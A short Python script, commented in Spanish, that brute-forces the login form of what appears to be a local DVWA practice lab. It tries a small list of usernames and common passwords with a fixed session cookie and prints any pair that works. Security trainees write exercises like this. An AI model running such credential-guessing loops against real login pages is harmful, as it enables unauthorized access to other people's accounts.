import requests

url = "http://localhost:4280/vulnerabilities/brute/"

cookies = {
    "PHPSESSID": "8a04547fb6aa1791e8104875b9534b29", 
    "security": "low"
}

# Listas de objetivos basadas en hallazgos previos
users = ["admin", "smithy", "pablo", "gordonb"]
passwords = ["password", "abc123", "letmein"]

print("--- Iniciando Validación de Credenciales (Python Requests) ---")
print(f"Objetivo: {url}\n")

for u in users:
    for p in passwords:
        # Definición de parámetros GET
        params = {'username': u, 'password': p, 'Login': 'Login'}
        
        # Ejecución de la petición
        response = requests.get(url, params=params, cookies=cookies)
        
        if "Welcome" in response.text:
            print(f"[+] ACCESO GARANTIZADO -> Usuario: {u} | Password: {p}")
        else:
            print(f"[-] Intento fallido: {u}:{p}")

print("\n--- Auditoría Finalizada ---")
